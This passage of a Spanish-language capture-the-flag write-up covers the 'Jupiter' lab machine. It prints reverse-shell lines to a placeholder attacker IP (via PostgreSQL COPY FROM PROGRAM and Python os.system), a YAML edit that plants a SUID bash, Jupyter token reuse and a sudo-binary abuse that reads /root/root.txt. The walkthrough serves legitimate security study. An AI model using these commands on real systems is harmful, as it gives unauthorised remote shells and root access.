+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span> <span class="nb">text</span><span class="p">);</span> <span class="k">COPY</span> <span class="n">cmd_exec</span> <span class="k">FROM</span> <span class="n">PROGRAM</span> <span class="s1">'bash -c </span><span class="se">\"</span><span class="s1">bash -i &gt;&amp; /dev/tcp/&lt;tu ip&gt;/443 0&gt;&amp;1</span><span class="se">\"</span><span class="s1">'</span><span class="p">;</span>
+</code></pre></div></div>
+<ul>
+  <li>
+    <p>Con <code class="language-plaintext highlighter-rouge">CREATE TABLE cmd_exec(cmd_output text)</code> le estamos diciendo que cree una tabla llamada <code class="language-plaintext highlighter-rouge">cmd_exec</code> en la cual tendra una columna llamada <code class="language-plaintext highlighter-rouge">cmd_output</code> de tipo <code class="language-plaintext highlighter-rouge">text</code>, la cual tendra el resultado del comando ejecutado</p>
+  </li>
+  <li>
+    <p>Despues con <code class="language-plaintext highlighter-rouge">COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;tu ip&gt;/443 0&gt;&amp;1\"'</code> le estamos diciendo que copie datos a la tabla <code class="language-plaintext highlighter-rouge">cmd_exec</code> ademas de que con <code class="language-plaintext highlighter-rouge">PROGRAM</code> estamos haciendo el llamado de un programa externo el cual es <code class="language-plaintext highlighter-rouge">bash</code> y ejecutara la reverse shell</p>
+  </li>
+</ul>
+
+<p>Y ya conseguimos una reverse shell</p>
+
+<h2 id="movimiento-lateral-de-postgres-a-juno">Movimiento lateral de postgres a Juno</h2>
+
+<p>Empezaremos analizando los procesos que esten ejecutandose en la maquina, asi que ejecutare pspy y encontraremos que se esta ejecutando un script desde el usuario Juno</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>21104  | /bin/bash /home/juno/shadow-simulation.sh
+</code></pre></div></div>
+
+<p>Ademas tambien veremos que esta copiando el archivo <code class="language-plaintext highlighter-rouge">network-simulation.yml</code> a <code class="language-plaintext highlighter-rouge">/dev/shm</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> <span class="nt">-a</span> /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
+</code></pre></div></div>
+
+<p>Si vemos el contenido del archivo tenemos esto:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">general</span><span class="pi">:</span>
+  <span class="c1"># stop after 10 simulated seconds</span>
+  <span class="na">stop_time</span><span class="pi">:</span> <span class="s">10s</span>
+  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
+  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
+  <span class="c1"># time when running non-blocking system calls</span>
+  <span class="na">model_unblocked_syscall_latency</span><span class="pi">:</span> <span class="no">true</span>
+
+<span class="na">network</span><span class="pi">:</span>
+  <span class="na">graph</span><span class="pi">:</span>
+    <span class="c1"># use a built-in network graph containing</span>
+    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">1_gbit_switch</span>
+
+<span class="na">hosts</span><span class="pi">:</span>
+  <span class="c1"># a host with the hostname 'server'</span>
+  <span class="na">server</span><span class="pi">:</span>
+    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
+    <span class="na">processes</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/python3</span>
+      <span class="na">args</span><span class="pi">:</span> <span class="s">-m http.server </span><span class="m">80</span>
+      <span class="na">start_time</span><span class="pi">:</span> <span class="s">3s</span>
+  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
+  <span class="na">client</span><span class="pi">:</span>
+    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
+    <span class="na">quantity</span><span class="pi">:</span> <span class="m">3</span>
+    <span class="na">processes</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/curl</span>
+      <span class="na">args</span><span class="pi">:</span> <span class="s">-s server</span>
+      <span class="na">start_time</span><span class="pi">:</span> <span class="s">5s</span>
+</code></pre></div></div>
+
+<p>Si analizamos un poco, vemos que se esta implementando un servidor y un cliente, de lado del servidor se esta ejecutando un comando de python el cual iniciar un servidor http:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="na">processes</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/python3</span>
+      <span class="na">args</span><span class="pi">:</span> <span class="s">-m http.server </span><span class="m">80</span>
+</code></pre></div></div>
+
+<p>Y del lado del cliente se esta haciendo una peticion a ese servidor creado:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">processes</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/curl</span>
+      <span class="na">args</span><span class="pi">:</span> <span class="s">-s server</span>
+</code></pre></div></div>
+
+<p>Como tenemos permisos de escritura en el archivo, entonces podemos decirle que ejecute cualquier otro comando, lo mas sencillo es darle permisos SUID a bash para que nosotros tengamos una shell como Juno, editaremos el archivo yaml de esta manera:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">general</span><span class="pi">:</span>
+  <span class="c1"># stop after 10 simulated seconds</span>
+  <span class="na">stop_time</span><span class="pi">:</span> <span class="s">10s</span>
+  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
+  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
+  <span class="c1"># time when running non-blocking system calls</span>
+  <span class="na">model_unblocked_syscall_latency</span><span class="pi">:</span> <span class="no">true</span>
+
+<span class="na">network</span><span class="pi">:</span>
+  <span class="na">graph</span><span class="pi">:</span>
+    <span class="c1"># use a built-in network graph containing</span>
+    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">1_gbit_switch</span>
+
+<span class="na">hosts</span><span class="pi">:</span>
+  <span class="c1"># a host with the hostname 'server'</span>
+  <span class="na">server</span><span class="pi">:</span>
+    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
+    <span class="na">processes</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/cp</span>
+      <span class="na">args</span><span class="pi">:</span> <span class="s">/bin/bash /tmp/bash</span>
+      <span class="na">start_time</span><span class="pi">:</span> <span class="s">3s</span>
+  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
+  <span class="na">client</span><span class="pi">:</span>
+    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
+    <span class="na">quantity</span><span class="pi">:</span> <span class="m">3</span>
+    <span class="na">processes</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/chmod</span>
+      <span class="na">args</span><span class="pi">:</span> <span class="s">u+s /tmp/bash</span>
+      <span class="na">start_time</span><span class="pi">:</span> <span class="s">5s</span>
+</code></pre></div></div>
+<p>Y depues de unos segundos en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code> tendremos el binario bash con permisos SUID, solo ejecutamos y ya somos Juno, ah este punto ya tenemos la flag de user</p>
+
+<h2 id="movimiento-lateral-de-juno-a-jovian">Movimiento lateral de Juno a Jovian</h2>
+
+<p>Si vemos a que grupos pertenece Juno, podemos ver que existe en el Science:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
+</code></pre></div></div>
+
+<p>Si buscamos por acrhivos que pertenescan a ese grupo, encontramos varios de Jupyter</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type f -group science 2&gt; /dev/null
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/solar-flares/flares.csv
+/opt/solar-flares/xflares.csv
+/opt/solar-flares/map.jpg
+/opt/solar-flares/start.sh
+/opt/solar-flares/logs/jupyter-2023-03-10-25.log
+/opt/solar-flares/logs/jupyter-2023-03-08-37.log
+/opt/solar-flares/logs/jupyter-2023-03-08-38.log
+/opt/solar-flares/logs/jupyter-2023-03-08-36.log
+/opt/solar-flares/logs/jupyter-2023-03-09-11.log
+/opt/solar-flares/logs/jupyter-2023-03-09-24.log
+/opt/solar-flares/logs/jupyter-2023-03-08-14.log
+/opt/solar-flares/logs/jupyter-2023-03-09-59.log
+/opt/solar-flares/flares.html
+/opt/solar-flares/cflares.csv
+/opt/solar-flares/flares.ipynb
+/opt/solar-flares/mflares.csv
+</code></pre></div></div>
+
+<p>Si vemos uno de los logs vamos a poder ver unos token:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /opt/solar-flares/logs/jupyter-2023-03-08-37.log
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To access the notebook, open this file in a browser:
+  file:///home/jovian/.local/share/jupyter/runtime/nbserver-1388-open.html
+Or copy and paste one of these URLs:
+  http://localhost:8889/?token=5313d7bfe0eb674db299f627f4be1212d17c6758b7b98989
+</code></pre></div></div>
+<p>Asi que es posible que ocupemos ese token para acceder a Jupyter</p>
+
+<p>Y un poco mas arriba del mismo log nos dice que el puerto 8888 esta ocupado:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[I 11:37:49.348 NotebookApp] The port 8888 is already in use, trying another port.
+[I 11:37:49.349 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
+</code></pre></div></div>
+
+<p>Eso lo podemos comprobar por que si mostramos los puertos abiertos, el 8888 esta ocupado:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:44097         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33637         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:54143         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:56017         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -  &lt;--- Este                 
+tcp        0      0 127.0.0.1:39535         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:45609         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+</code></pre></div></div>
+
+<p>Asi que haremos portforwarding de ese puerto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
+</code></pre></div></div>
+
+<p>Como era de esperarse, tenemos que usar un token para acceder:</p>
+
+<p><img src="/assets/img/jupiter/4.png" alt="" /></p>
+
+<p>Podemos usar el token que averiguamos anteriormente, pero en caso de que no te funcione, puedes buscar mas tokens en: <code class="language-plaintext highlighter-rouge">/opt/solar-flares/logs</code></p>
+
+<p>Si vemos uno de los archivos, podemos ver que es esta ejecutando un comando, asi que nosotros podemos intentar lo mismo pero una reverse shell</p>
+
+<p><img src="/assets/img/jupiter/5.png" alt="" /></p>
+
+<p>Jupyter al estar trabajando un Python, entonces nos mandaremos un reverse shell usando el modulo <code class="language-plaintext highlighter-rouge">os</code>:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bash -c "bash -i &gt;&amp; /dev/tcp/&lt;tu_ip&gt;/443 0&gt;&amp;1"'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Una vez que lo ejecutemos ya seremos Jovian</p>
+
+<p><img src="/assets/img/jupiter/6.png" alt="" /></p>
+
+<h2 id="jovian-a-root">Jovian a Root</h2>
+
+<p>Si buscamos por binarios que podamos ejectuar como root sin contraseña con <code class="language-plaintext highlighter-rouge">sudo -l</code>, podemos ver uno que se llama <code class="language-plaintext highlighter-rouge">sattrack</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User jovian may run the following commands on jupiter:
+    (ALL) NOPASSWD: /usr/local/bin/sattrack
+</code></pre></div></div>
+
+<p>Si lo tratamos de ejecutar nos dira que un archivo de configuracion no se encuentra:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/sattrack
+Satellite Tracking System
+Configuration file has not been found. Please try again!
+</code></pre></div></div>
+
+<p>Si vemos el tipo de archivo que es sattrack nos dira que es un binario ELF:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/sattrack: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c68bedeeb5dd99903454a774db56a7a533ce7ff4, for GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+
+<p>Me pase el archivo a mi maquina, y usando rabin2, mostrare los string buscando por archivos de configuracion:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rabin2 -z sattrack | grep -i config
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>491 0x0007bd48 0x0007bd48 16   17   .rodata ascii   /tmp/config.json
+</code></pre></div></div>
+
+<p>Podemos ver que esta buscando un archivo JSON en <code class="language-plaintext highlighter-rouge">/tmp/config.json</code>, si buscamos mas informacion de sattrack en internet, podemos ver su repositorio y el archivo json que espera: <a href="https://github.com/arf20/arftracksat/blob/master/config.json">https://github.com/arf20/arftracksat/blob/master/config.json</a></p>
+
+<p>Si seguimos buscando por archivos config.json de sattrack encontraremos uno en <code class="language-plaintext highlighter-rouge">/usr/local/share/sattrack/config.json</code> el cual contiene esto</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+	</span><span class="nl">"tleroot"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/tmp/tle/"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"tlefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"weather.txt"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"mapfile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"texturefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span><span class="w">
+	
+	</span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="s2">"http://celestrak.org/NORAD/elements/weather.txt"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=t
+le"</span><span class="w">
+	</span><span class="p">],</span><span class="w">
+	
+	</span><span class="nl">"updatePerdiod"</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span><span class="w">
+	
+	</span><span class="nl">"station"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+		</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"LORCA"</span><span class="p">,</span><span class="w">
+		</span><span class="nl">"lat"</span><span class="p">:</span><span class="w"> </span><span class="mf">37.6725</span><span class="p">,</span><span class="w">
+		</span><span class="nl">"lon"</span><span class="p">:</span><span class="w"> </span><span class="mf">-1.5863</span><span class="p">,</span><span class="w">
+		</span><span class="nl">"hgt"</span><span class="p">:</span><span class="w"> </span><span class="mf">335.0</span><span class="w">
+	</span><span class="p">},</span><span class="w">
+	
+	</span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+	</span><span class="p">],</span><span class="w">
+	
+	</span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="s2">"name"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"azel"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"dis"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"geo"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"tab"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"pos"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"vel"</span><span class="w">
+	</span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Asi que ese lo copiaremos al directorio /tmp</p>
+
+<p>Una vez que tengamos el config.json en /tmp, ejecutaremos el sattrack: <code class="language-plaintext highlighter-rouge">sudo /usr/local/bin/sattrack</code></p>
+
+<p>Vemos como estara intentando descargar recursos de los URL que estan dentro de:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="s2">"http://celestrak.org/NORAD/elements/weather.txt"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle"</span><span class="w">
+</span><span class="p">]</span><span class="err">,</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/img/jupiter/9.png" alt="" /></p>
+
+<p>Y luego los guardara en <code class="language-plaintext highlighter-rouge">/tmp/tle/</code> como lo indica <code class="language-plaintext highlighter-rouge">"tleroot": "/tmp/tle/",</code></p>
+
+<p>Asi que podriamos hacer que descargue de la misma maquina el archivo de la flag de root y lo guarde en el directorio <code class="language-plaintext highlighter-rouge">/tmp/tle/</code></p>
+
+<p>Editaremos el archivo <code class="language-plaintext highlighter-rouge">config.json</code> y agregaremos esto en <code class="language-plaintext highlighter-rouge">tlesources</code> –&gt; <code class="language-plaintext highlighter-rouge">"file:///root/root.txt"</code>, quedando el archivo asi:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+	</span><span class="nl">"tleroot"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/tmp/tle/"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"tlefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"weather.txt"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"mapfile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"texturefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span><span class="w">
+	
+	</span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="s2">"file:///root/root.txt"</span><span class="w">
+	</span><span class="p">],</span><span class="w">
+	
+	</span><span class="nl">"updatePerdiod"</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span><span class="w">
+	
+	</span><span class="nl">"station"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+		</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"LORCA"</span><span class="p">,</span><span class="w">
+		</span><span class="nl">"lat"</span><span class="p">:</span><span class="w"> </span><span class="mf">37.6725</span><span class="p">,</span><span class="w">
+		</span><span class="nl">"lon"</span><span class="p">:</span><span class="w"> </span><span class="mf">-1.5863</span><span class="p">,</span><span class="w">
+		</span><span class="nl">"hgt"</span><span class="p">:</span><span class="w"> </span><span class="mf">335.0</span><span class="w">
+	</span><span class="p">},</span><span class="w">
+	
+	</span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+	</span><span class="p">],</span><span class="w">
+	
+	</span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="s2">"name"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"azel"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"dis"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"geo"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"tab"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"pos"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"vel"</span><span class="w">
+	</span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Solo lo ejecutamos y ya tendriamos la flag de root</p>
+
+<p><img src="/assets/img/jupiter/8.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
